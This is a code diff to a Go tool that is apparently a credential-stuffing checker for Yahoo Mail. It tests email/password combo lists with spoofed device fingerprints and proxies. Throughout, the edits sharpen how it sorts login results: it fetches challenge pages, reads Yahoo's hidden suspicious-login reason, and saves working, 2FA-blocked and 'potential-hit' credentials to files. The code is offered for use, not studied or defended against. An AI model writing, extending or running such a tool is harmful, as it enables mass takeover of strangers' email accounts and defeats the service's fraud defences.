@@ -115,8 +115,9 @@ type ipqsResult struct {
 }
 
 type loginResult struct {
-	IRI      string
-	Response string
+	IRI           string
+	Response      string
+	ResponseStep  string
 }
 
 func mustAbs(p string) string {
@@ -780,19 +781,81 @@ func extractEid(raw string) string {
 	return ""
 }
 
+func isAccountChallengeURL(u string) bool {
+	return regexp.MustCompile(`(?i)/account/challenge/`).MatchString(u) &&
+		!regexp.MustCompile(`(?i)challenge/(?:fail|password)`).MatchString(u)
+}
+
+func extractHiddenInput(html, name string) string {
+	if v := pick(html, name); v != "" {
+		return v
+	}
+	patterns := []string{
+		`(?is)<input[^>]*\bname=["']` + regexp.QuoteMeta(name) + `["'][^>]*\bvalue=["']([^"']*)["']`,
+		`(?is)<input[^>]*\bvalue=["']([^"']*)["'][^>]*\bname=["']` + regexp.QuoteMeta(name) + `["']`,
+	}
+	for _, p := range patterns {
+		if m := regexp.MustCompile(p).FindStringSubmatch(html); len(m) > 1 {
+			return htmlUnescape(m[1])
+		}
+	}
+	return ""
+}
+
+func htmlUnescape(s string) string {
+	s = strings.ReplaceAll(s, "&amp;", "&")
+	s = strings.ReplaceAll(s, "&quot;", `"`)
+	s = strings.ReplaceAll(s, "&#39;", "'")
+	return s
+}
+
+func classifySecondChallengeReason(html string) (kind, detail string, ok bool) {
+	reason := extractHiddenInput(html, "secondChallengeReason")
+	if reason == "" {
+		return "", "", false
+	}
+	detail = "secondChallengeReason=" + reason
+	if strings.HasPrefix(strings.ToUpper(reason), "SUSPICIOUS_LOGIN") {
+		return "potential-hit", detail, true
+	}
+	return "2fa", detail, true
+}
+
+func classifyChallengeHTML(html string) error {
+	if kind, detail, ok := classifySecondChallengeReason(html); ok {
+		return fmt.Errorf("%s (%s)", kind, detail)
+	}
+	return nil
+}
+
+func challengeDetailFromReason(reason string) string {
+	if i := strings.Index(reason, "secondChallengeReason="); i >= 0 {
+		return strings.TrimSpace(reason[i:])
+	}
+	if m := regexp.MustCompile(`\(([^)]+)\)`).FindStringSubmatch(reason); len(m) > 1 {
+		return m[1]
+	}
+	return ""
+}
 func isPotentialHitRedirect(redirect string) bool {
-	// Password accepted, but Yahoo asks to choose a next challenge (no eid).
-	return regexp.MustCompile(`(?i)challenge-selector`).MatchString(redirect) &&
-		!regexp.MustCompile(`(?i)[?&]eid=`).MatchString(redirect)
+	// Potential-hit is decided only from challenge HTML (secondChallengeReason=SUSPICIOUS_LOGIN…).
+	// URL path alone is never enough.
+	_ = redirect
+	return false
 }
 
 func is2FARedirect(redirect string) bool {
-	if regexp.MustCompile(`(?i)yak-code|challenge/otp|two-factor|(?:^|/)2fa(?:/|$)|tsv-`).MatchString(redirect) {
+	if redirect == "" {
+		return false
+	}
+	if regexp.MustCompile(`(?i)yak-code|challenge/otp|challenge/push|challenge-selector|two-factor|(?:^|/)2fa(?:/|$)|tsv-`).MatchString(redirect) {
 		return true
 	}
-	// challenge-selector with eid (e.g. eid=4200) is a forced 2FA/security challenge
-	return regexp.MustCompile(`(?i)challenge-selector`).MatchString(redirect) &&
-		regexp.MustCompile(`(?i)[?&]eid=`).MatchString(redirect)
+	// Other /account/challenge/* pages (device verify, etc.) — not fail/password retry.
+	if isAccountChallengeURL(redirect) {
+		return true
+	}
+	return false
 }
 
 func mapPasswordRedirect(redirect string) error {
@@ -825,6 +888,11 @@ func mapPasswordRedirect(redirect string) error {
 		return fmt.Errorf("password challenge failed")
 	}
 	return nil
+}
+
+func (r *loginResult) setResponse(step, raw string) {
+	r.ResponseStep = step
+	r.Response = compactResponse(raw)
 }
 
 func compactResponse(raw string) string {
@@ -877,7 +945,7 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo, fp deviceFP) (log
 	if err != nil {
 		return out, err
 	}
-	out.Response = compactResponse(userRaw)
+	out.setResponse("email", userRaw)
 	userJSON, err := parseJSONMap(userRaw)
 	if err != nil {
 		return out, fmt.Errorf("username step did not return JSON")
@@ -893,11 +961,10 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo, fp deviceFP) (log
 	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(passURL) {
 		return out, fmt.Errorf("username challenge fail")
 	}
-	if is2FARedirect(passURL) {
+	// Email-step challenges (including challenge-selector) are always 2FA —
+	// potential-hit is only decided after a successful password via secondChallengeReason HTML.
+	if is2FARedirect(passURL) || isPotentialHitRedirect(passURL) || isAccountChallengeURL(passURL) {
 		return out, fmt.Errorf("2fa")
-	}
-	if isPotentialHitRedirect(passURL) {
-		return out, fmt.Errorf("potential-hit")
 	}
 	if passURL == "" || !regexp.MustCompile(`(?i)password`).MatchString(passURL) {
 		return out, fmt.Errorf("unexpected next step: %s", firstNonEmpty(passURL, userRaw))
@@ -950,7 +1017,7 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo, fp deviceFP) (log
 	if err != nil {
 		return out, err
 	}
-	out.Response = compactResponse(passRaw)
+	out.setResponse("pass", passRaw)
 	passJSON, err := parseJSONMap(passRaw)
 	if err != nil {
 		return out, fmt.Errorf("password step did not return JSON")
@@ -963,6 +1030,26 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo, fp deviceFP) (log
 	if err := mapPasswordRedirect(redirect); err != nil {
 		return out, err
 	}
+
+	if redirect != "" {
+		if isAccountChallengeURL(redirect) {
+			challengeHTML, _, challengeURL, err := doRequest(client, http.MethodGet, redirect, "", fp.headers(map[string]string{
+				"Accept":  "text/html,application/xhtml+xml",
+				"Referer": passURL,
+			}), true)
+			if err != nil {
+				return out, err
+			}
+			// Keep pass API JSON as the logged response; HTML is only for classification.
+			if err := classifyChallengeHTML(challengeHTML); err != nil {
+				return out, err
+			}
+			redirect = challengeURL
+		} else {
+			_, _, _, _ = doRequest(client, http.MethodGet, redirect, "", fp.headers(nil), true)
+		}
+	}
+
 	if isPotentialHitRedirect(redirect) {
 		return out, fmt.Errorf("potential-hit")
 	}
@@ -970,22 +1057,19 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo, fp deviceFP) (log
 		return out, fmt.Errorf("2fa")
 	}
 
-	if redirect != "" {
-		_, _, _, _ = doRequest(client, http.MethodGet, redirect, "", fp.headers(nil), true)
-	}
-
 	mailRaw, _, mailURL, err := doRequest(client, http.MethodGet, "https://mail.yahoo.com/", "", fp.headers(nil), true)
 	if err != nil {
 		return out, err
 	}
-	_ = mailRaw
+
+	if err := classifyChallengeHTML(mailRaw); err != nil {
+		return out, err
+	}
 
 	if is2FARedirect(mailURL) {
-		out.Response = compactResponse(mailURL)
 		return out, fmt.Errorf("2fa")
 	}
 	if isPotentialHitRedirect(mailURL) {
-		out.Response = compactResponse(mailURL)
 		return out, fmt.Errorf("potential-hit")
 	}
 
@@ -1002,8 +1086,7 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo, fp deviceFP) (log
 	}
 	if !loggedIn {
 		// Login bounce to a challenge page should not be a generic invalid.
-		if is2FARedirect(mailURL) || regexp.MustCompile(`(?i)/account/challenge/`).MatchString(mailURL) {
-			out.Response = compactResponse(mailURL)
+		if is2FARedirect(mailURL) || isAccountChallengeURL(mailURL) {
 			if isPotentialHitRedirect(mailURL) {
 				return out, fmt.Errorf("potential-hit")
 			}
@@ -1183,8 +1266,14 @@ func saveComboResult(kind resultKind, login Combo, detail string) {
 	switch kind {
 	case result2FA:
 		file = twoFAFile
+		if d := challengeDetailFromReason(detail); d != "" {
+			line = combo + " | " + d + "\n"
+		}
 	case resultPotentialHit:
 		file = potentialHitFile
+		if d := challengeDetailFromReason(detail); d != "" {
+			line = combo + " | " + d + "\n"
+		}
 	case resultCaptcha:
 		file = captchaFile
 		line = combo + " | " + detail + "\n"
@@ -1220,7 +1309,7 @@ func stamp(checked int) string {
 	return fmt.Sprintf("%ds | cpm=%d", sec, cpm)
 }
 
-func formatComboLine(kind resultKind, checked, total int, login Combo, ip, detail, response string) string {
+func formatComboLine(kind resultKind, checked, total int, login Combo, ip, detail, responseStep, response string) string {
 	color := cBrightRed
 	status := "FAIL"
 	switch kind {
@@ -1251,8 +1340,18 @@ func formatComboLine(kind resultKind, checked, total int, login Combo, ip, detai
 	)
 	line := paint(color, main)
 	response = compactResponse(response)
-	if response != "" {
-		line += paintGray(" | " + response)
+	if responseStep != "" || response != "" {
+		extra := ""
+		if responseStep != "" {
+			extra = "step=" + responseStep
+		}
+		if response != "" {
+			if extra != "" {
+				extra += " | "
+			}
+			extra += response
+		}
+		line += paintGray(" | " + extra)
 	}
 	return line
 }
@@ -1309,6 +1408,7 @@ func checkCombo(login Combo, checked *atomic.Int64, total int) resultKind {
 		lastKind   resultKind
 		lastIP     string
 		lastDetail string
+		lastStep   string
 		lastResp   string
 	)
 
@@ -1344,7 +1444,7 @@ func checkCombo(login Combo, checked *atomic.Int64, total int) resultKind {
 		if err == nil {
 			n := int(checked.Add(1))
 			saveComboResult(resultValid, login, "")
-			fmt.Println(formatComboLine(resultValid, n, total, login, ip, "iri="+result.IRI, result.Response))
+			fmt.Println(formatComboLine(resultValid, n, total, login, ip, "iri="+result.IRI, result.ResponseStep, result.Response))
 			return resultValid
 		}
 
@@ -1353,6 +1453,7 @@ func checkCombo(login Combo, checked *atomic.Int64, total int) resultKind {
 		lastIP = ip
 		lastDetail = detail
 		lastResp = result.Response
+		lastStep = result.ResponseStep
 
 		if isRetryableReason(detail) && attempt < maxAttempts {
 			continue
@@ -1360,7 +1461,7 @@ func checkCombo(login Combo, checked *atomic.Int64, total int) resultKind {
 
 		n := int(checked.Add(1))
 		saveComboResult(kind, login, detail)
-		fmt.Println(formatComboLine(kind, n, total, login, ip, detail, result.Response))
+		fmt.Println(formatComboLine(kind, n, total, login, ip, detail, lastStep, result.Response))
 		return kind
 	}
 
@@ -1372,7 +1473,7 @@ func checkCombo(login Combo, checked *atomic.Int64, total int) resultKind {
 		lastDetail = "proxy issue"
 	}
 	saveComboResult(lastKind, login, lastDetail)
-	fmt.Println(formatComboLine(lastKind, n, total, login, lastIP, lastDetail, lastResp))
+	fmt.Println(formatComboLine(lastKind, n, total, login, lastIP, lastDetail, lastStep, lastResp))
 	return lastKind
 }
 
